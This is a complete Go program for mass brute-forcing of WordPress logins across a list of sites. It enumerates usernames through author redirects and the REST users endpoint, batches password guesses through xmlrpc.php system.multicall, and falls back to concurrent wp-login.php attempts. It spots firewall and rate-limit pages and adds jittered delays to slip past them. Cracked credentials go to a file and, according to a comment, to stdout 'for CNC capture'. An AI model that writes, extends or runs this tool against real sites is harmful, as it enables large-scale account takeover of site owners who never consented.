package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"encoding/xml"
	"errors"
	"flag"
	"fmt"
	"math/rand"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/fatih/color"
	"github.com/valyala/fasthttp"
)

var errBlocked = errors.New("blocked")

var (
	currentPass      string
	currentPassMutex sync.Mutex
)

type MethodCall struct {
	MethodName string        `xml:"methodName"`
	Params     []interface{} `xml:"params>param"`
}

type MethodResponse struct {
	Params []interface{} `xml:"params>param"`
	Fault  *Fault        `xml:"fault"`
}

type Fault struct {
	FaultCode   int    `xml:"faultCode"`
	FaultString string `xml:"faultString"`
}

type MultiCallResponse struct {
	XMLName xml.Name `xml:"methodResponse"`
	Params  []Param  `xml:"params>param"`
	Fault   *Fault   `xml:"fault"`
}

type Param struct {
	Value Value `xml:"value"`
}

type Value struct {
	Array  *Array  `xml:"array"`
	Struct *Struct `xml:"struct"`
}

type Array struct {
	Data Data `xml:"data"`
}

type Data struct {
	Values []Value `xml:"value"`
}

type Struct struct {
	Members []Member `xml:"member"`
}

type Member struct {
	Name  string `xml:"name"`
	Value Value  `xml:"value"`
}

type Result struct {
	URL      string
	Username string
	Password string
	Valid    bool
}

type SiteResult struct {
	URL   string
	Valid bool
}

var (
	sitesFile   = flag.String("sites", "", "File containing WordPress sites (one per line) [required]")
	userListFile = flag.String("userlist", "", "File containing additional usernames (one per line)")
	passListFile = flag.String("passlist", "", "File containing passwords (one per line) [required]")
	outputFile  = flag.String("output", "results.txt", "Output file for valid credentials")
	concurrency = flag.Int("concurrency", 100, "Number of concurrent workers")
	batchSize   = flag.Int("batch", 100, "Number of login attempts per multicall batch")
	timeout     = flag.Int("timeout", 10, "Request timeout in seconds")
	delayMs     = flag.Int("delay", 0, "Delay between batch requests in milliseconds (with random jitter)")
	loginConc   = flag.Int("login-concurrency", 10, "Concurrent password attempts per site in wp-login fallback")
	enumUsers   = flag.Bool("enum", true, "Enumerate usernames via ?author=N and REST API")
)

func main() {
	flag.Parse()

	if *sitesFile == "" {
		fmt.Fprintln(os.Stderr, "Error: -sites file is required")
		flag.Usage()
		os.Exit(1)
	}
	if *passListFile == "" {
		fmt.Fprintln(os.Stderr, "Error: -passlist file is required")
		flag.Usage()
		os.Exit(1)
	}

	targets, err := readURLs(*sitesFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error reading sites file: %v\n", err)
		os.Exit(1)
	}

	var userList []string
	if *userListFile != "" {
		userList, err = readLines(*userListFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error reading userlist file: %v\n", err)
			os.Exit(1)
		}
	}

	passList, err := readLines(*passListFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error reading passlist file: %v\n", err)
		os.Exit(1)
	}

	resultsChan := make(chan Result, 1000)
	siteResultChan := make(chan SiteResult, 1000)
	var wg sync.WaitGroup

	workerCount := *concurrency
	if workerCount > len(targets) {
		workerCount = len(targets)
	}

	siteChan := make(chan string, len(targets))
	for _, site := range targets {
		siteChan <- site
	}
	close(siteChan)

	successSites := 0
	failedSites := 0
	var siteCounterMutex sync.Mutex
	processedSites := 0
	var processedMutex sync.Mutex
	var lastProcessed []string

yellow := color.New(color.FgYellow).SprintFunc()
 	cyan := color.New(color.FgCyan).SprintFunc()

fmt.Fprintf(os.Stderr, "%s Starting scan: %d targets, %d users, %d passes\n", cyan(">>"), len(targets), len(userList), len(passList))

	var currentSite string
	var currentSiteMutex sync.Mutex
	var enumPhase bool
	var enumPhaseMutex sync.Mutex

	doneChan := make(chan struct{})
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-doneChan:
				return
			case <-ticker.C:
				currentSiteMutex.Lock()
				site := currentSite
				currentSiteMutex.Unlock()
				enumPhaseMutex.Lock()
				phase := enumPhase
				enumPhaseMutex.Unlock()
				processedMutex.Lock()
				done := processedSites
				processedMutex.Unlock()
				siteCounterMutex.Lock()
				success := successSites
				failed := failedSites
				siteCounterMutex.Unlock()
				currentPassMutex.Lock()
				pass := currentPass
				currentPassMutex.Unlock()
				if site != "" {
					phaseStr := "brute"
					if phase {
						phaseStr = "enum "
					}
					if pass != "" {
						fmt.Fprintf(os.Stderr, "\r%s [%s] success %d failed %d processed %d/%d | %s | trying pass: %s", cyan(">>"), phaseStr, success, failed, done, len(targets), site, pass)
					} else {
						fmt.Fprintf(os.Stderr, "\r%s [%s] success %d failed %d processed %d/%d | %s", cyan(">>"), phaseStr, success, failed, done, len(targets), site)
					}
				}
			}
		}
	}()

	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &fasthttp.Client{
				ReadTimeout:  time.Duration(*timeout) * time.Second,
				WriteTimeout: time.Duration(*timeout) * time.Second,
				MaxConnsPerHost: 100,
				MaxIdleConnDuration: 30 * time.Second,
			}
			for site := range siteChan {
				currentSiteMutex.Lock()
				currentSite = site
				currentSiteMutex.Unlock()

users := userList
			if *enumUsers {
				enumPhaseMutex.Lock()
				enumPhase = true
				enumPhaseMutex.Unlock()
				enum := enumerateUsers(client, site, *timeout)
				enumPhaseMutex.Lock()
				enumPhase = false
				enumPhaseMutex.Unlock()
				if len(enum) > 0 {
					users = append(users, enum...)
					users = uniqueStrings(users)
				}
			}

				siteValid := bruteForceSite(client, site, users, passList, *batchSize, *delayMs, resultsChan)
				siteResultChan <- SiteResult{URL: site, Valid: siteValid}

				processedMutex.Lock()
				processedSites++
				if len(lastProcessed) < 3 {
					lastProcessed = append(lastProcessed, site)
				} else {
					lastProcessed = append(lastProcessed[1:], site)
				}
				processedMutex.Unlock()
			}
		}()
	}

go func() {
		wg.Wait()
		close(resultsChan)
		close(siteResultChan)
		close(doneChan)
	}()

	output, err := os.Create(*outputFile)
   	if err != nil {
   		fmt.Fprintf(os.Stderr, "Error creating output file: %v\n", err)
   		os.Exit(1)
   	}
   	defer output.Close()

   	var writeMutex sync.Mutex

	siteConsumerDone := make(chan struct{})
	go func() {
		for sr := range siteResultChan {
			siteCounterMutex.Lock()
			if sr.Valid {
				successSites++
			} else {
				failedSites++
			}
			siteCounterMutex.Unlock()
		}
		close(siteConsumerDone)
	}()

   	for result := range resultsChan {
   		if result.Valid {
			green := color.New(color.FgGreen).SprintFunc()
   			line := fmt.Sprintf("%s | %s | %s\n", result.URL, result.Username, result.Password)
			dashboardURL := strings.TrimRight(result.URL, "/") + "/wp-admin/"
   			fmt.Fprintf(os.Stderr, "%s CRACKED %s Username: %s | Password: %s\n", green(">>"), dashboardURL, result.Username, result.Password)
   			// Stream clean result (url | user | pass) to stdout for CNC capture.
   			fmt.Printf("%s | %s | %s\n", result.URL, result.Username, result.Password)
   			writeMutex.Lock()
   			output.WriteString(line)
   			output.Sync()
   			writeMutex.Unlock()
   		}
   	}

	<-siteConsumerDone

processedMutex.Lock()
  	done := processedSites
  	last := lastProcessed
  	processedMutex.Unlock()

	siteCounterMutex.Lock()
	success := successSites
	failed := failedSites
	siteCounterMutex.Unlock()

  	fmt.Fprintf(os.Stderr, "\n%s Scan complete. success %d failed %d processed %d/%d\n", yellow(">>"), success, failed, done, len(targets))
 	if len(last) > 0 {
 		fmt.Fprintf(os.Stderr, "%s Last processed: %s\n", cyan(">>"), strings.Join(last, ", "))
 	}
 	fmt.Fprintf(os.Stderr, "Results saved to: %s\n", *outputFile)
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func readURLs(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "https://" + line
			}
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func bruteForceSite(client *fasthttp.Client, site string, users, passes []string, batchSize, delayMs int, results chan<- Result) bool {
	xmlrpcURL := strings.TrimRight(site, "/") + "/xmlrpc.php"
	found := false

	for _, user := range users {
		for i := 0; i < len(passes); i += batchSize {
			if i > 0 && delayMs > 0 {
				d := time.Duration(delayMs) * time.Millisecond
				jitter := time.Duration(rand.Intn(delayMs/2+1)) * time.Millisecond
				time.Sleep(d + jitter)
			}

			end := i + batchSize
			if end > len(passes) {
				end = len(passes)
			}
			batch := passes[i:end]

			reqBody := buildMultiCallRequest(user, batch)
			respBody, err := doRequest(client, xmlrpcURL, reqBody)
			if err != nil {
				if errors.Is(err, errBlocked) {
					break
				}
				if bruteForceLogin(client, site, user, batch, delayMs, results) {
					found = true
					break
				}
				continue
			}

			foundBatch, unchecked := parseMultiCallResponse(respBody, site, user, batch, results)
			if foundBatch {
				found = true
				break
			}
			if len(unchecked) > 0 {
				if bruteForceLogin(client, site, user, unchecked, delayMs, results) {
					found = true
					break
				}
			} else if !foundBatch {
				if bruteForceLogin(client, site, user, batch, delayMs, results) {
					found = true
					break
				}
			}
		}
		if found {
			break
		}
	}
	return found
}

func bruteForceLogin(client *fasthttp.Client, site, username string, passwords []string, delayMs int, results chan<- Result) bool {
	loginURL := strings.TrimRight(site, "/") + "/wp-login.php"
	dashboardURL := strings.TrimRight(site, "/") + "/wp-admin/"

	var found atomic.Bool

	passChan := make(chan string, len(passwords))
	for _, p := range passwords {
		passChan <- p
	}
	close(passChan)

	workerCount := *loginConc
	if workerCount < 1 {
		workerCount = 1
	}
	if workerCount > len(passwords) {
		workerCount = len(passwords)
	}

	var wg sync.WaitGroup
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for pass := range passChan {
				if found.Load() {
					return
				}

				currentPassMutex.Lock()
				currentPass = pass
				currentPassMutex.Unlock()

				if delayMs > 0 {
					d := time.Duration(delayMs) * time.Millisecond
					jitter := time.Duration(rand.Intn(delayMs/2+1)) * time.Millisecond
					time.Sleep(d + jitter)
				}

				if tryLogin(client, loginURL, dashboardURL, site, username, pass, results) {
					found.Store(true)
					return
				}
			}
		}()
	}
	wg.Wait()
	return found.Load()
}

func tryLogin(client *fasthttp.Client, loginURL, dashboardURL, site, username, pass string, results chan<- Result) bool {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()

	req.SetRequestURI(loginURL)
	req.Header.SetMethod("POST")
	req.Header.SetContentType("application/x-www-form-urlencoded")
	req.SetBody(buildLoginForm(username, pass))

	err := client.Do(req, resp)
	statusCode := resp.StatusCode()

	if err != nil {
		fasthttp.ReleaseRequest(req)
		fasthttp.ReleaseResponse(resp)
		return false
	}

	if statusCode == 403 || statusCode == 429 {
		fasthttp.ReleaseRequest(req)
		fasthttp.ReleaseResponse(resp)
		return false
	}

	if statusCode == 302 {
		cookies := string(resp.Header.Peek("Set-Cookie"))
		fasthttp.ReleaseRequest(req)
		fasthttp.ReleaseResponse(resp)

		req2 := fasthttp.AcquireRequest()
		resp2 := fasthttp.AcquireResponse()

		req2.SetRequestURI(dashboardURL)
		req2.Header.SetMethod("GET")
		req2.Header.Set("Cookie", cookies)

		err2 := client.Do(req2, resp2)
		if err2 == nil {
			body := resp2.Body()
			if resp2.StatusCode() == 200 && bytes.Contains(body, []byte("Dashboard")) {
				fasthttp.ReleaseRequest(req2)
				fasthttp.ReleaseResponse(resp2)
				results <- Result{URL: site, Username: username, Password: pass, Valid: true}
				return true
			}
		}
		fasthttp.ReleaseRequest(req2)
		fasthttp.ReleaseResponse(resp2)
		return false
	}

	body := resp.Body()
	blocked := isBlocked(body)
	fasthttp.ReleaseRequest(req)
	fasthttp.ReleaseResponse(resp)

	if blocked {
		return false
	}
	return false
}

func buildLoginForm(username, pass string) []byte {
	form := url.Values{}
	form.Set("log", username)
	form.Set("pwd", pass)
	form.Set("wp-submit", "Log In")
	return []byte(form.Encode())
}

func buildMultiCallRequest(username string, passwords []string) []byte {
	var calls []MethodCall
	for _, pass := range passwords {
		calls = append(calls, MethodCall{
			MethodName: "wp.getUsersBlogs",
			Params:     []interface{}{username, pass},
		})
	}

	var buf bytes.Buffer
	buf.WriteString(`<?xml version="1.0" encoding="UTF-8"?>`)
	buf.WriteString(`<methodCall>`)
	buf.WriteString(`<methodName>system.multicall</methodName>`)
	buf.WriteString(`<params><param><value><array><data>`)

	for _, call := range calls {
		buf.WriteString(`<value><struct>`)
		buf.WriteString(`<member><name>methodName</name><value><string>`)
		buf.WriteString(xmlEscape(call.MethodName))
		buf.WriteString(`</string></value></member>`)
		buf.WriteString(`<member><name>params</name><value><array><data>`)
		for _, param := range call.Params {
			buf.WriteString(`<value><string>`)
			if s, ok := param.(string); ok {
				buf.WriteString(xmlEscape(s))
			} else {
				buf.WriteString(xmlEscape(fmt.Sprintf("%v", param)))
			}
			buf.WriteString(`</string></value>`)
		}
		buf.WriteString(`</data></array></value></member>`)
		buf.WriteString(`</struct></value>`)
	}

	buf.WriteString(`</data></array></value></param></params>`)
	buf.WriteString(`</methodCall>`)
	return buf.Bytes()
}

func xmlEscape(s string) string {
	s = strings.ReplaceAll(s, "&", "&")
	s = strings.ReplaceAll(s, "<", "<")
	s = strings.ReplaceAll(s, ">", ">")
	s = strings.ReplaceAll(s, "\"", "&" + "quot;")
	s = strings.ReplaceAll(s, "'", "&apos;")
	return s
}

func doRequest(client *fasthttp.Client, url string, body []byte) ([]byte, error) {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(url)
	req.Header.SetMethod("POST")
	req.Header.SetContentType("text/xml")
	req.SetBody(body)

	err := client.Do(req, resp)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode() == 403 || resp.StatusCode() == 429 {
		return nil, errBlocked
	}

	if resp.StatusCode() != 200 {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode())
	}

	respBody := resp.Body()
	if isBlocked(respBody) {
		return nil, errBlocked
	}

	bodyCopy := make([]byte, len(respBody))
	copy(bodyCopy, respBody)
	return bodyCopy, nil
}

func isBlocked(body []byte) bool {
	checkLen := len(body)
	if checkLen > 2048 {
		checkLen = 2048
	}
	lower := strings.ToLower(string(body[:checkLen]))
	if !strings.Contains(lower, "<html") && !strings.Contains(lower, "<!doctype") {
		return false
	}
	
	for _, kw := range []string{
		"access denied", "captcha", "challenge platform",
		"cloudflare", "security check", "rate limit", "too many requests",
		"firewall", "mod_security", "wordfence",
		"blocked by", "ip blocked", "request blocked",
	} {
		if strings.Contains(lower, kw) {
			return true
		}
	}
	return false
}

func parseMultiCallResponse(body []byte, site, username string, passwords []string, results chan<- Result) (bool, []string) {
	var response MultiCallResponse
	if err := xml.Unmarshal(body, &response); err != nil {
		return false, passwords
	}

	if response.Fault != nil {
		return false, passwords
	}

	if len(response.Params) == 0 || response.Params[0].Value.Array == nil {
		return false, passwords
	}

	resultValues := response.Params[0].Value.Array.Data.Values
	if len(resultValues) != len(passwords) {
		return false, passwords
	}

	found := false
	allFailed := true
	var tempResults []Result
	
	for i, resultVal := range resultValues {
		valid := isValidLoginResult(resultVal)
		if valid {
			found = true
			allFailed = false
		}
		tempResults = append(tempResults, Result{
			URL:      site,
			Username: username,
			Password: passwords[i],
			Valid:    valid,
		})
	}
	
	if !found && allFailed {
		return false, passwords
	}
	
	for _, r := range tempResults {
		results <- r
	}
	
	return found, nil
}

func isValidLoginResult(result Value) bool {
	if result.Struct != nil {
		for _, member := range result.Struct.Members {
			if member.Name == "faultCode" || member.Name == "faultString" {
				return false
			}
		}
	}
	if result.Array != nil && result.Array.Data.Values != nil {
		for _, val := range result.Array.Data.Values {
			if val.Struct != nil && len(val.Struct.Members) > 0 {
				return true
			}
			if val.Array != nil {
				return isValidLoginResult(val)
			}
		}
	}
	return false
}

func enumerateUsers(client *fasthttp.Client, site string, timeout int) []string {
	seen := make(map[string]struct{})
	var users []string

	addUser := func(u string) {
		if u != "" {
			if _, exists := seen[u]; !exists {
				seen[u] = struct{}{}
				users = append(users, u)
			}
		}
	}

	for i := 1; i <= 10; i++ {
		url := fmt.Sprintf("%s/?author=%d", strings.TrimRight(site, "/"), i)
		req := fasthttp.AcquireRequest()
		resp := fasthttp.AcquireResponse()
		req.SetRequestURI(url)
		req.Header.SetMethod("GET")
		err := client.Do(req, resp)
		fasthttp.ReleaseRequest(req)
		if err != nil {
			fasthttp.ReleaseResponse(resp)
			continue
		}
		location := resp.Header.Peek("Location")
		if location != nil {
			loc := string(location)
			if strings.Contains(loc, "/author/") {
				parts := strings.Split(loc, "/author/")
				if len(parts) > 1 {
					addUser(strings.Trim(parts[1], "/"))
				}
			}
		}
		fasthttp.ReleaseResponse(resp)
	}

	restURLs := []string{
		strings.TrimRight(site, "/") + "/wp-json/wp/v2/users",
		strings.TrimRight(site, "/") + "/index.php?rest_route=/wp/v2/users",
	}
	for _, restURL := range restURLs {
		req := fasthttp.AcquireRequest()
		resp := fasthttp.AcquireResponse()
		req.SetRequestURI(restURL)
		req.Header.SetMethod("GET")
		err := client.Do(req, resp)
		fasthttp.ReleaseRequest(req)
		if err == nil && resp.StatusCode() == 200 {
			body := resp.Body()
			bodyCopy := make([]byte, len(body))
			copy(bodyCopy, body)
			fasthttp.ReleaseResponse(resp)
			var restUsers []map[string]interface{}
			if json.Unmarshal(bodyCopy, &restUsers) == nil {
				for _, u := range restUsers {
					if slug, ok := u["slug"].(string); ok {
						addUser(slug)
					}
					if name, ok := u["name"].(string); ok {
						addUser(name)
					}
				}
			}
			break
		} else {
			fasthttp.ReleaseResponse(resp)
		}
	}

	return users
}

func uniqueStrings(slice []string) []string {
	seen := make(map[string]bool)
	result := []string{}
	for _, s := range slice {
		if !seen[s] {
			seen[s] = true
			result = append(result, s)
		}
	}
	return result
}